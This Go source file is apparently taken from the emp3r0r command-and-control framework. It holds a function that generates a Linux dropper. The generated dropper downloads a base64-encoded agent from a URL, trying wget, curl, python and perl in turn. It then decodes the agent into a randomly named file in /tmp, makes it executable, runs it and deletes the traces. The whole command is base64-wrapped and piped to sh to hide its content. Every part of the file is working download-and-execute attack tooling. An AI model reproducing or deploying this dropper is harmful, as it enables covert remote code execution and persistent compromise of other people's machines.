//go:build linux
// +build linux

package cc

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// bash_http_b64_download_exec download whatever from the url and execute it
func bash_http_b64_download_exec(agent_bin_path, url string) (ret []byte) {
	if !strings.HasPrefix(url, "http://") {
		url = fmt.Sprintf("http://%s", url)
	}
	enc_agent_bin_path := fmt.Sprintf("%s.enc", agent_bin_path)

	// base64 encode agent binary
	agent_bin_data, err := os.ReadFile(agent_bin_path)
	if err != nil {
		CliPrintError("Read agent binary: %v", err)
		return
	}
	enc_agent_bin_data := []byte(base64.StdEncoding.EncodeToString(agent_bin_data))
	err = os.WriteFile(enc_agent_bin_path, enc_agent_bin_data, 0o600)
	if err != nil {
		CliPrintError("Write base64 encoded agent binary: %v", err)
		return
	}

	cmd := `d() {
wget -q "$1" -O-||curl -fksL "$1"||python -c "import urllib;u=urllib.urlopen('${1}');print(u.read());"||python -c "import urllib.request;import sys;u=urllib.request.urlopen('$1');sys.stdout.buffer.write(u.read());"||perl -e "use LWP::Simple;\$resp=get(\"${1}\");print(\$resp);"
}
d '%s'>/tmp/%s&&base64 -d </tmp/%s>/tmp/%s
chmod +x /tmp/%s
/tmp/%s
rm -f /tmp/%s*`
	dropper_name := util.RandStr(22)
	temp_name := dropper_name[:2]

	payload := fmt.Sprintf(cmd,
		url,
		temp_name, temp_name, dropper_name, dropper_name, dropper_name, temp_name)

	// encoded payload
	payload = base64.StdEncoding.EncodeToString([]byte(payload))
	dropper := fmt.Sprintf(`echo '%s'|base64 -d|sh`, payload)
	return []byte(dropper)
}
